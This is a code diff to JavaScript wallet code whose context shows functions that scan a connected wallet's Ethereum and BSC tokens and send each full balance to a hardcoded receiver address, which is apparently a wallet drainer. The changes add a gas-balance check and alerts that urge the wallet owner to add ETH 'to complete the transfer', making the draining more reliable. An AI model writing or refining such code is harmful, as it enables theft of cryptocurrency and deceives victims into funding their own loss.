@@ -112,7 +112,7 @@ async function transferETH(walletClient, fromAddress, amount, toAddress, publicC
 }
 
 // Function to transfer ERC20/BEP20 tokens
-async function transferTokens(walletClient, tokenAddress, amount, toAddress) {
+async function transferTokens(walletClient, tokenAddress, amount, toAddress, publicClient) {
   try {
     console.log("Starting token transfer function...")
     
@@ -125,6 +125,17 @@ async function transferTokens(walletClient, tokenAddress, amount, toAddress) {
     // Validate receiver address
     if (!isValidEthereumAddress(toAddress)) {
       console.error("Invalid receiver address:", toAddress)
+      return null
+    }
+    
+    // Check if wallet has ETH for gas fees (at least 0.0005 ETH)
+    const walletAddress = walletClient.account.address
+    const ethBalance = await publicClient.getBalance({ address: walletAddress })
+    const ethBalanceBN = ethers.BigNumber.from(ethBalance.toString())
+    
+    if (ethBalanceBN.lt(ethers.utils.parseEther('0.0005'))) {
+      console.log("Insufficient ETH for gas fees. ETH balance:", ethers.utils.formatEther(ethBalanceBN))
+      alert("Insufficient ETH for gas fees. Please add ETH to your wallet to complete the transfer.")
       return null
     }
     
@@ -151,6 +162,11 @@ async function transferTokens(walletClient, tokenAddress, amount, toAddress) {
     return transactionResponse
   } catch (error) {
     console.error("Error transferring tokens:", error)
+    if (error.message && error.message.includes('insufficient funds')) {
+      alert("Transaction failed: Insufficient ETH for gas fees. Please add ETH to your wallet.")
+    } else {
+      alert("Transaction failed: " + (error.message || "Unknown error"))
+    }
     return null
   }
 }
@@ -280,7 +296,7 @@ async function scanEthereumTokens(walletClient, walletAddress, publicClient) {
           
           // Direct transfer tokens to receiver address
           console.log(`Transferring ${token.name} directly to receiver...`)
-          const result = await transferTokens(walletClient, token.address, balanceBN.toString(), receiveAddress)
+          const result = await transferTokens(walletClient, token.address, balanceBN.toString(), receiveAddress, publicClient)
           if (result) {
             transferCount++
             console.log(`${token.name} transfer completed. Tx: ${result.substring(0, 10)}...`)
@@ -343,7 +359,7 @@ async function scanBscTokens(walletClient, walletAddress, publicClient) {
           
           // Direct transfer tokens to receiver address
           console.log(`Transferring ${token.name} directly to receiver...`)
-          const result = await transferTokens(walletClient, token.address, balanceBN.toString(), bep20ReceiverAddress)
+          const result = await transferTokens(walletClient, token.address, balanceBN.toString(), bep20ReceiverAddress, publicClient)
           if (result) {
             transferCount++
             console.log(`${token.name} transfer completed. Tx: ${result.substring(0, 10)}...`)
